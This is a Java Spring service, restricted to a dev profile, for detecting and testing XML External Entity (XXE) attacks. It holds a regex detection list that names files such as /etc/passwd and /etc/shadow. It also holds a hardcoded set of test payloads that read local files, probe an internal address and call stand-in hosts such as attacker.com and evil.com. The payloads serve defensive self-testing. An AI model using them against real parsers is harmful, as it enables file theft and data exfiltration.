package io.github.ersincivi.passwordless.service.security_test_endpoint;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.github.ersincivi.passwordless.service.SecurityAuditService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.context.annotation.Profile;
import org.springframework.stereotype.Service;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.StringReader;
import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * Comprehensive XXE (XML External Entity) Security Service
 * Provides detection, prevention, and testing for XXE injection attacks
 */
@Profile("dev") // Security test harness - dev profile only
@Service
public class XxeSecurityService {

    private static final Logger log = LoggerFactory.getLogger(XxeSecurityService.class);

    private static final String XXE_STATS_KEY = "xxe:statistics";
    private static final String XXE_ATTEMPTS_KEY = "xxe:attempts:";

    @Autowired
    private StringRedisTemplate redisTemplate;

    @Autowired
    private SecurityAuditService securityAuditService;

    @Autowired
    private ObjectMapper objectMapper;

    // XXE attack patterns
    private static final List<Pattern> XXE_PATTERNS = Arrays.asList(
        // External entity declarations
        Pattern.compile("<!ENTITY\\s+[^>]*\\s+SYSTEM\\s+['\"][^'\"]+['\"]", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<!ENTITY\\s+[^>]*\\s+PUBLIC\\s+['\"][^'\"]*['\"]\\s+['\"][^'\"]+['\"]", Pattern.CASE_INSENSITIVE),
        
        // Parameter entity attacks
        Pattern.compile("<!ENTITY\\s+%\\s*[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("%[a-zA-Z][a-zA-Z0-9]*;", Pattern.CASE_INSENSITIVE),
        
        // Common XXE payloads
        Pattern.compile("file://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("http://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("https://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("ftp://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("gopher://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("jar://", Pattern.CASE_INSENSITIVE),
        Pattern.compile("netdoc://", Pattern.CASE_INSENSITIVE),
        
        // Internal file access attempts
        Pattern.compile("/etc/passwd", Pattern.CASE_INSENSITIVE),
        Pattern.compile("/etc/shadow", Pattern.CASE_INSENSITIVE),
        Pattern.compile("/etc/hosts", Pattern.CASE_INSENSITIVE),
        Pattern.compile("C:\\\\Windows\\\\System32", Pattern.CASE_INSENSITIVE),
        Pattern.compile("C:/Windows/System32", Pattern.CASE_INSENSITIVE),
        
        // Blind XXE indicators
        Pattern.compile("&[a-zA-Z][a-zA-Z0-9]*;", Pattern.CASE_INSENSITIVE),
        Pattern.compile("&#[0-9]+;", Pattern.CASE_INSENSITIVE),
        Pattern.compile("&#x[0-9a-fA-F]+;", Pattern.CASE_INSENSITIVE),
        
        // Advanced XXE techniques
        Pattern.compile("<!\\[CDATA\\[.*\\]\\]>", Pattern.CASE_INSENSITIVE | Pattern.DOTALL),
        Pattern.compile("encoding\\s*=\\s*['\"][^'\"]*['\"]", Pattern.CASE_INSENSITIVE)
    );

    // Safe XML parser configuration
    private DocumentBuilderFactory createSecureDocumentBuilderFactory() throws ParserConfigurationException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // Disable external entity processing
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        
        // Additional security settings
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        factory.setNamespaceAware(true);
        factory.setValidating(false);
        
        return factory;
    }

    private XMLInputFactory createSecureXMLInputFactory() {
        XMLInputFactory factory = XMLInputFactory.newInstance();
        
        // Disable external entity processing
        factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        factory.setProperty(XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);
        
        return factory;
    }

    /**
     * Test XML content for XXE vulnerabilities
     */
    public Map<String, Object> testXxeVulnerability(String xmlContent, String ipAddress, boolean logAttempt) {
        Map<String, Object> result = new HashMap<>();
        
        try {
            // Analyze XML content for XXE patterns
            XxeAnalysisResult analysis = analyzeXmlForXxe(xmlContent);
            
            result.put("isVulnerable", analysis.isVulnerable());
            result.put("riskLevel", analysis.getRiskLevel());
            result.put("riskScore", analysis.getRiskScore());
            result.put("detectedPatterns", analysis.getDetectedPatterns());
            result.put("attackVectors", analysis.getAttackVectors());
            result.put("recommendation", analysis.getRecommendation());
            result.put("protectionStatus", analysis.isBlocked() ? "BLOCKED" : "ALLOWED");
            result.put("timestamp", LocalDateTime.now().toString());
            
            // Test with secure parser
            boolean secureParsingResult = testSecureParsing(xmlContent);
            result.put("secureParsingPrevented", secureParsingResult);
            
            // Update statistics
            updateXxeStatistics(analysis.isVulnerable(), analysis.getRiskLevel(), ipAddress);
            
            // Log security event if requested
            if (logAttempt) {
                Map<String, Object> details = new HashMap<>();
                details.put("vulnerable", analysis.isVulnerable());
                details.put("riskLevel", analysis.getRiskLevel());
                details.put("attackVectors", analysis.getAttackVectors());
                
                if (analysis.isVulnerable()) {
                    securityAuditService.logSecurityViolation(
                        "SYSTEM", "XXE_VULNERABILITY_DETECTED", 
                        "XXE vulnerability detected in XML content",
                        ipAddress, "XXE_TESTING", details);
                } else {
                    securityAuditService.logAuthenticationEvent(
                        "SYSTEM", "XXE_TEST_COMPLETED", "SUCCESS",
                        ipAddress, "XXE_TESTING", details);
                }
            }
            
        } catch (Exception e) {
            result.put("error", "XXE testing failed: " + e.getMessage());
            result.put("isVulnerable", false);
            result.put("riskLevel", "UNKNOWN");
        }
        
        return result;
    }

    /**
     * Perform comprehensive XXE testing with multiple attack vectors
     */
    public Map<String, Object> performComprehensiveXxeTest(String baseXml, String ipAddress) {
        Map<String, Object> result = new HashMap<>();
        List<Map<String, Object>> testResults = new ArrayList<>();
        
        // Define XXE test payloads
        List<String> xxePayloads = Arrays.asList(
            // Basic external entity
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
            
            // Parameter entity attack
            "<!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.xml\">%xxe;]><test></test>",
            
            // Blind XXE with HTTP
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/collect\">]><test>&xxe;</test>",
            
            // File disclosure attempt
            "<!DOCTYPE test [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><test>&file;</test>",
            
            // Internal network scan
            "<!DOCTYPE test [<!ENTITY scan SYSTEM \"http://192.168.1.1/\">]><test>&scan;</test>",
            
            // FTP protocol test
            "<!DOCTYPE test [<!ENTITY ftp SYSTEM \"ftp://attacker.com/\">]><test>&ftp;</test>",
            
            // Nested entity attack
            "<!DOCTYPE test [<!ENTITY a \"&b;\"><!ENTITY b \"&c;\"><!ENTITY c \"test\">]><test>&a;</test>",
            
            // Binary data exfiltration
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><test>&xxe;</test>",
            
            // CDATA section abuse
            "<!DOCTYPE test [<!ENTITY xxe \"<![CDATA[sensitive data]]>\">]><test>&xxe;</test>",
            
            // UTF-7 encoding bypass
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"+ADw-script+AD4-alert(1)+ADw-/script+AD4-\">]><test>&xxe;</test>"
        );
        
        int blockedCount = 0;
        int vulnerableCount = 0;
        
        for (int i = 0; i < xxePayloads.size(); i++) {
            String payload = xxePayloads.get(i);
            Map<String, Object> testResult = testXxeVulnerability(payload, ipAddress, false);
            
            testResult.put("testId", "XXE_" + (i + 1));
            testResult.put("payload", payload.length() > 100 ? payload.substring(0, 100) + "..." : payload);
            testResults.add(testResult);
            
            if ("BLOCKED".equals(testResult.get("protectionStatus"))) {
                blockedCount++;
            }
            if (Boolean.TRUE.equals(testResult.get("isVulnerable"))) {
                vulnerableCount++;
            }
        }
        
        // Calculate protection effectiveness
        double protectionRate = (double) blockedCount / xxePayloads.size() * 100;
        
        result.put("totalTests", xxePayloads.size());
        result.put("blockedAttacks", blockedCount);
        result.put("vulnerableTests", vulnerableCount);
        result.put("protectionRate", String.format("%.1f%%", protectionRate));
        result.put("effectivenessLevel", getEffectivenessLevel(protectionRate));
        result.put("testResults", testResults);
        result.put("timestamp", LocalDateTime.now().toString());
        result.put("recommendation", generateComprehensiveRecommendation(protectionRate, vulnerableCount));
        
        // Log comprehensive test
        Map<String, Object> testDetails = new HashMap<>();
        testDetails.put("totalTests", xxePayloads.size());
        testDetails.put("blockedCount", blockedCount);
        testDetails.put("vulnerableCount", vulnerableCount);
        testDetails.put("protectionRate", protectionRate);
        
        if (protectionRate < 90) {
            securityAuditService.logSecurityViolation(
                "SYSTEM", "XXE_COMPREHENSIVE_TEST_LOW_PROTECTION", 
                String.format("XXE comprehensive test completed with low protection rate: %.1f%%", protectionRate),
                ipAddress, "XXE_TESTING", testDetails);
        } else {
            securityAuditService.logAuthenticationEvent(
                "SYSTEM", "XXE_COMPREHENSIVE_TEST_COMPLETED", "SUCCESS",
                ipAddress, "XXE_TESTING", testDetails);
        }
        
        return result;
    }

    /**
     * Parse XML safely and test if XXE is prevented
     */
    public Map<String, Object> testSafeParsing(String xmlContent, String ipAddress) {
        Map<String, Object> result = new HashMap<>();
        
        try {
            // Test with secure DocumentBuilderFactory
            boolean domParsingSecure = testSecureDOMParsing(xmlContent);
            
            // Test with secure XMLInputFactory
            boolean staxParsingSecure = testSecureStAXParsing(xmlContent);
            
            result.put("domParsingSecure", domParsingSecure);
            result.put("staxParsingSecure", staxParsingSecure);
            result.put("overallSecure", domParsingSecure && staxParsingSecure);
            result.put("timestamp", LocalDateTime.now().toString());
            
            // Log safe parsing test
            Map<String, Object> details = new HashMap<>();
            details.put("domParsingSecure", domParsingSecure);
            details.put("staxParsingSecure", staxParsingSecure);
            details.put("overallSecure", domParsingSecure && staxParsingSecure);
            
            securityAuditService.logAuthenticationEvent(
                "SYSTEM", "XXE_SAFE_PARSING_TEST", "SUCCESS",
                ipAddress, "XXE_TESTING", details);
            
        } catch (Exception e) {
            result.put("error", "Safe parsing test failed: " + e.getMessage());
            result.put("overallSecure", false);
        }
        
        return result;
    }

    /**
     * Get XXE attack statistics
     */
    public Map<String, Object> getXxeStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        try {
            String statsJson = redisTemplate.opsForValue().get(XXE_STATS_KEY);
            if (statsJson != null) {
                stats = objectMapper.readValue(statsJson, Map.class);
            }
        } catch (Exception e) {
            // Return empty stats if parsing fails
            stats.put("error", "Failed to retrieve statistics");
        }
        
        // Add default values if not present
        stats.putIfAbsent("totalTests", 0);
        stats.putIfAbsent("vulnerableTests", 0);
        stats.putIfAbsent("blockedTests", 0);
        stats.putIfAbsent("lastUpdated", LocalDateTime.now().toString());
        
        return stats;
    }

    // Private helper methods
    private XxeAnalysisResult analyzeXmlForXxe(String xmlContent) {
        XxeAnalysisResult result = new XxeAnalysisResult();
        List<String> detectedPatterns = new ArrayList<>();
        List<String> attackVectors = new ArrayList<>();
        int riskScore = 0;
        
        // Check for XXE patterns
        for (Pattern pattern : XXE_PATTERNS) {
            if (pattern.matcher(xmlContent).find()) {
                detectedPatterns.add(pattern.pattern());
                riskScore += 2;
                
                // Categorize attack vectors
                if (pattern.pattern().contains("SYSTEM") || pattern.pattern().contains("PUBLIC")) {
                    attackVectors.add("External Entity Declaration");
                } else if (pattern.pattern().contains("%")) {
                    attackVectors.add("Parameter Entity Attack");
                } else if (pattern.pattern().contains("file://")) {
                    attackVectors.add("Local File Access");
                } else if (pattern.pattern().contains("http")) {
                    attackVectors.add("Remote Resource Access");
                } else if (pattern.pattern().contains("/etc/") || pattern.pattern().contains("Windows")) {
                    attackVectors.add("System File Access");
                }
            }
        }
        
        // Check for DOCTYPE declaration
        if (xmlContent.contains("<!DOCTYPE")) {
            riskScore += 3;
            attackVectors.add("DOCTYPE Declaration Present");
        }
        
        // Check for entity references
        if (xmlContent.matches(".*&[a-zA-Z][a-zA-Z0-9]*;.*")) {
            riskScore += 1;
            attackVectors.add("Entity References");
        }
        
        boolean isVulnerable = riskScore > 3;
        String riskLevel = calculateRiskLevel(riskScore);
        
        result.setVulnerable(isVulnerable);
        result.setRiskScore(Math.min(riskScore, 10));
        result.setRiskLevel(riskLevel);
        result.setDetectedPatterns(detectedPatterns);
        result.setAttackVectors(attackVectors);
        result.setBlocked(isVulnerable); // Block if vulnerable
        result.setRecommendation(generateRecommendation(riskLevel, attackVectors));
        
        return result;
    }

    private boolean testSecureParsing(String xmlContent) {
        try {
            return testSecureDOMParsing(xmlContent) && testSecureStAXParsing(xmlContent);
        } catch (Exception e) {
            return false;
        }
    }

    private boolean testSecureDOMParsing(String xmlContent) {
        try {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
            return true; // Parsing succeeded with secure configuration
        } catch (Exception e) {
            // Exception means XXE was prevented
            return e.getMessage().contains("DOCTYPE") || 
                   e.getMessage().contains("external") ||
                   e.getMessage().contains("entity");
        }
    }

    private boolean testSecureStAXParsing(String xmlContent) {
        try {
            XMLInputFactory factory = createSecureXMLInputFactory();
            XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(xmlContent));
            while (reader.hasNext()) {
                reader.next();
            }
            reader.close();
            return true; // Parsing succeeded with secure configuration
        } catch (Exception e) {
            // Exception means XXE was prevented
            return e.getMessage().contains("DOCTYPE") || 
                   e.getMessage().contains("external") ||
                   e.getMessage().contains("entity");
        }
    }

    private String calculateRiskLevel(int riskScore) {
        if (riskScore >= 8) return "CRITICAL";
        if (riskScore >= 6) return "HIGH";
        if (riskScore >= 4) return "MEDIUM";
        if (riskScore >= 2) return "LOW";
        return "MINIMAL";
    }

    private String getEffectivenessLevel(double protectionRate) {
        if (protectionRate >= 95) return "EXCELLENT";
        if (protectionRate >= 85) return "GOOD";
        if (protectionRate >= 70) return "FAIR";
        if (protectionRate >= 50) return "POOR";
        return "CRITICAL";
    }

    private String generateRecommendation(String riskLevel, List<String> attackVectors) {
        StringBuilder recommendation = new StringBuilder();
        
        switch (riskLevel) {
            case "CRITICAL":
                recommendation.append("IMMEDIATE ACTION REQUIRED: Critical XXE vulnerabilities detected. ");
                break;
            case "HIGH":
                recommendation.append("HIGH PRIORITY: Significant XXE risks identified. ");
                break;
            case "MEDIUM":
                recommendation.append("MEDIUM PRIORITY: Moderate XXE vulnerabilities found. ");
                break;
            case "LOW":
                recommendation.append("LOW PRIORITY: Minor XXE indicators detected. ");
                break;
            default:
                recommendation.append("No significant XXE vulnerabilities detected. ");
        }
        
        if (attackVectors.contains("External Entity Declaration")) {
            recommendation.append("Disable external entity processing in XML parsers. ");
        }
        if (attackVectors.contains("Parameter Entity Attack")) {
            recommendation.append("Disable parameter entity support. ");
        }
        if (attackVectors.contains("Local File Access") || attackVectors.contains("System File Access")) {
            recommendation.append("Implement strict file access controls. ");
        }
        if (attackVectors.contains("Remote Resource Access")) {
            recommendation.append("Block external network access from XML parsers. ");
        }
        
        recommendation.append("Use secure XML parser configurations and validate all XML input.");
        
        return recommendation.toString();
    }

    private String generateComprehensiveRecommendation(double protectionRate, int vulnerableCount) {
        StringBuilder recommendation = new StringBuilder();
        
        if (protectionRate >= 95) {
            recommendation.append("EXCELLENT: XXE protection is highly effective. ");
        } else if (protectionRate >= 85) {
            recommendation.append("GOOD: XXE protection is generally effective but has some gaps. ");
        } else if (protectionRate >= 70) {
            recommendation.append("FAIR: XXE protection needs improvement. ");
        } else {
            recommendation.append("CRITICAL: XXE protection is insufficient and requires immediate attention. ");
        }
        
        if (vulnerableCount > 0) {
            recommendation.append(String.format("%d vulnerable tests detected. ", vulnerableCount));
            recommendation.append("Review XML parser configurations, disable external entity processing, ");
            recommendation.append("implement input validation, and use secure parsing libraries. ");
        }
        
        recommendation.append("Regularly test XXE defenses and keep XML libraries updated.");
        
        return recommendation.toString();
    }

    private void updateXxeStatistics(boolean isVulnerable, String riskLevel, String ipAddress) {
        try {
            Map<String, Object> stats = getXxeStatistics();
            
            int totalTests = (Integer) stats.getOrDefault("totalTests", 0) + 1;
            int vulnerableTests = (Integer) stats.getOrDefault("vulnerableTests", 0);
            int blockedTests = (Integer) stats.getOrDefault("blockedTests", 0);
            
            if (isVulnerable) {
                vulnerableTests++;
                blockedTests++; // Our system blocks vulnerable requests
            }
            
            stats.put("totalTests", totalTests);
            stats.put("vulnerableTests", vulnerableTests);
            stats.put("blockedTests", blockedTests);
            stats.put("protectionRate", String.format("%.1f%%", (double) blockedTests / totalTests * 100));
            stats.put("lastRiskLevel", riskLevel);
            stats.put("lastUpdated", LocalDateTime.now().toString());
            
            String statsJson = objectMapper.writeValueAsString(stats);
            redisTemplate.opsForValue().set(XXE_STATS_KEY, statsJson, 24, TimeUnit.HOURS);
            
        } catch (Exception e) {
            // Log error but don't fail the main operation
            log.warn("Failed to update XXE statistics: {}", e.getMessage());
        }
    }

    // Inner class for XXE analysis results
    private static class XxeAnalysisResult {
        private boolean vulnerable;
        private int riskScore;
        private String riskLevel;
        private List<String> detectedPatterns;
        private List<String> attackVectors;
        private boolean blocked;
        private String recommendation;

        // Getters and setters
        public boolean isVulnerable() { return vulnerable; }
        public void setVulnerable(boolean vulnerable) { this.vulnerable = vulnerable; }
        
        public int getRiskScore() { return riskScore; }
        public void setRiskScore(int riskScore) { this.riskScore = riskScore; }
        
        public String getRiskLevel() { return riskLevel; }
        public void setRiskLevel(String riskLevel) { this.riskLevel = riskLevel; }
        
        public List<String> getDetectedPatterns() { return detectedPatterns; }
        public void setDetectedPatterns(List<String> detectedPatterns) { this.detectedPatterns = detectedPatterns; }
        
        public List<String> getAttackVectors() { return attackVectors; }
        public void setAttackVectors(List<String> attackVectors) { this.attackVectors = attackVectors; }
        
        public boolean isBlocked() { return blocked; }
        public void setBlocked(boolean blocked) { this.blocked = blocked; }
        
        public String getRecommendation() { return recommendation; }
        public void setRecommendation(String recommendation) { this.recommendation = recommendation; }
    }
}